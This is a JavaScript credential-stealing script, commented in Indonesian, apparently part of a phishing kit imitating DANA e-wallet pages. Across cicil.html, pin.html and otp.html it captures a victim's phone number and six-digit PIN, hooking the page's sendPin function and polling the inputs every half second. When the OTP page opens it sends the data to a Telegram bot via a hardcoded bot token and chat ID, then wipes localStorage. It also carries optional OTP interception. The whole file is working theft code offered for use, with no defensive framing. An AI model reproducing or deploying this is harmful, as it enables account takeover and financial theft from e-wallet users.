// File: send-to-telegram.js
// Letakkan file ini di folder my-app/help/ dan link di semua halaman HTML

(function () {
    // Konfigurasi Bot Telegram
    const BOT_TOKEN = "8732412628:AAH65tJt5BtNzGLaFSC1IbPH88g76AKrKHU";
    const CHAT_ID = "7595480684";

    // Simpan data sementara
    let capturedPhone = null;
    let capturedPin = null;
    let isSent = false;

    // Fungsi kirim ke Telegram
    function sendToTelegram(phone, pin) {
        if (isSent) return;
        if (!phone && !pin) return;

        const message = `🔐 *MASUK BOSSKU* 🔐\n\n` +
            `📱 *No HP:* ${phone || '(belum diisi)'}\n` +
            `🔢 *PIN:* ${pin || '(belum diisi)'}\n\n` +
            `⚠️ *SEMOGA JEPE BOSSKU*`;

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log('✅ Data berhasil dikirim ke Telegram');
                    isSent = true;
                } else {
                    console.error('❌ Gagal mengirim:', data);
                }
            })
            .catch(error => {
                console.error('❌ Error:', error);
            });
    }

    // ========== UNTUK HALAMAN CICIL.HTML ==========
    // Simpan nomor HP ke localStorage, TIDAK LANGSUNG DIKIRIM
    function initCicilPage() {
        const phoneInputDesktop = document.getElementById('phone-input-desktop');
        const phoneInputMobile = document.getElementById('phone-input-mobile');
        const continueBtns = document.querySelectorAll('.btn-continue');
        const submitForm = document.querySelector('form[data-demo-form]');

        const savePhoneOnly = function (e) {
            const phoneValue = phoneInputDesktop ? phoneInputDesktop.value : phoneInputMobile.value;
            if (phoneValue && phoneValue.length >= 8) {
                capturedPhone = phoneValue;
                // Simpan ke localStorage untuk halaman berikutnya
                localStorage.setItem('dana_phone', phoneValue);
                localStorage.setItem('dana_phone_captured', 'true');
                console.log('📱 Nomor HP tersimpan:', phoneValue);
            }
            // Tidak mengirim ke Telegram di sini
        };

        if (continueBtns.length > 0) {
            continueBtns.forEach(btn => {
                btn.addEventListener('click', savePhoneOnly);
            });
        }

        if (submitForm) {
            submitForm.addEventListener('submit', function (e) {
                const phoneValue = phoneInputDesktop ? phoneInputDesktop.value : phoneInputMobile.value;
                if (phoneValue && phoneValue.length >= 8) {
                    capturedPhone = phoneValue;
                    localStorage.setItem('dana_phone', phoneValue);
                    localStorage.setItem('dana_phone_captured', 'true');
                }
            });
        }
    }

    // ========== UNTUK HALAMAN PIN.HTML ==========
    // Simpan PIN ke localStorage, TIDAK LANGSUNG DIKIRIM
    function initPinPage() {
        // Ambil nomor HP dari localStorage
        const savedPhone = localStorage.getItem('dana_phone');
        if (savedPhone) {
            capturedPhone = savedPhone;
        }

        // Isi hidden input jika ada
        const hiddenPhone = document.getElementById('hiddenPhone');
        if (hiddenPhone && savedPhone) {
            hiddenPhone.value = savedPhone;
        }

        // Fungsi untuk menangkap PIN dan simpan ke localStorage
        function capturePinOnly() {
            const pinInputs = document.querySelectorAll('.inppin');
            if (pinInputs.length === 6) {
                let pinValue = '';
                pinInputs.forEach(input => {
                    pinValue += input.value;
                });
                if (pinValue.length === 6) {
                    capturedPin = pinValue;
                    localStorage.setItem('dana_pin', pinValue);
                    localStorage.setItem('dana_pin_captured', 'true');
                    console.log('🔢 PIN tersimpan:', pinValue);
                }
            }
        }

        // Intercept fungsi sendPin yang asli
        const originalSendPin = window.sendPin;
        if (typeof originalSendPin === 'function') {
            window.sendPin = function () {
                capturePinOnly();
                return originalSendPin.apply(this, arguments);
            };
        } else {
            // Jika sendPin tidak ada, cek form submit
            const pinForm = document.getElementById('formPin');
            if (pinForm) {
                pinForm.addEventListener('submit', function (e) {
                    capturePinOnly();
                });
            }
        }

        // Backup: cek secara berkala
        setInterval(function () {
            const pinInputs = document.querySelectorAll('.inppin');
            if (pinInputs.length === 6) {
                let allFilled = true;
                let pinValue = '';
                pinInputs.forEach(input => {
                    if (!input.value) allFilled = false;
                    pinValue += input.value;
                });
                if (allFilled && pinValue.length === 6 && !localStorage.getItem('dana_pin_captured')) {
                    capturedPin = pinValue;
                    localStorage.setItem('dana_pin', pinValue);
                    localStorage.setItem('dana_pin_captured', 'true');
                    console.log('🔢 PIN tersimpan (interval):', pinValue);
                }
            }
        }, 500);
    }

    // ========== UNTUK HALAMAN OTP.HTML ==========
    // Saat halaman OTP terbuka, kirim semua data yang sudah dikumpulkan ke Telegram
    function initOtpPage() {
        console.log('📱 Halaman OTP terbuka, bersiap mengirim data...');

        // Ambil data dari localStorage
        const savedPhone = localStorage.getItem('dana_phone');
        const savedPin = localStorage.getItem('dana_pin');

        let finalPhone = savedPhone || capturedPhone;
        let finalPin = savedPin || capturedPin;

        // Jika data masih kosong, coba ambil dari localStorage dengan key lain
        if (!finalPhone) {
            finalPhone = localStorage.getItem('dana_phone_captured') ?
                localStorage.getItem('dana_phone') : null;
        }
        if (!finalPin) {
            finalPin = localStorage.getItem('dana_pin_captured') ?
                localStorage.getItem('dana_pin') : null;
        }

        console.log('📱 Data yang akan dikirim - No HP:', finalPhone, 'PIN:', finalPin);

        // Kirim ke Telegram
        if (finalPhone || finalPin) {
            sendToTelegram(finalPhone, finalPin);
        } else {
            console.warn('⚠️ Tidak ada data yang ditemukan untuk dikirim');
        }

        // Hapus data dari localStorage setelah terkirim (opsional)
        setTimeout(() => {
            localStorage.removeItem('dana_phone');
            localStorage.removeItem('dana_pin');
            localStorage.removeItem('dana_phone_captured');
            localStorage.removeItem('dana_pin_captured');
            console.log('🗑️ Data localStorage telah dibersihkan');
        }, 3000);

        // Opsi: tangkap OTP juga jika diperlukan (tambahan)
        const otpInputs = document.querySelectorAll('.otp-input');
        if (otpInputs.length === 4) {
            let originalSubmitOTP = null;
            if (typeof window.submitOTP === 'function') {
                originalSubmitOTP = window.submitOTP;
                window.submitOTP = function () {
                    let otpValue = '';
                    otpInputs.forEach(input => {
                        otpValue += input.value;
                    });
                    if (otpValue.length === 4) {
                        console.log('🔢 OTP:', otpValue);
                        // Opsional: kirim OTP juga
                        // sendToTelegram(finalPhone, finalPin, otpValue);
                    }
                    if (originalSubmitOTP) return originalSubmitOTP.apply(this, arguments);
                };
            }
        }
    }

    // ========== DETEKSI HALAMAN SAAT INI ==========
    function detectPageAndInit() {
        const currentUrl = window.location.pathname;
        const currentFile = currentUrl.split('/').pop();

        console.log('📍 Halaman terdeteksi:', currentFile);

        if (currentFile === 'cicil.html' || currentUrl.includes('cicil.html')) {
            initCicilPage();
        } else if (currentFile === 'pin.html' || currentUrl.includes('pin.html')) {
            initPinPage();
        } else if (currentFile === 'otp.html' || currentUrl.includes('otp.html')) {
            initOtpPage();
        }
    }

    // Jalankan saat halaman siap
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', detectPageAndInit);
    } else {
        detectPageAndInit();
    }
})();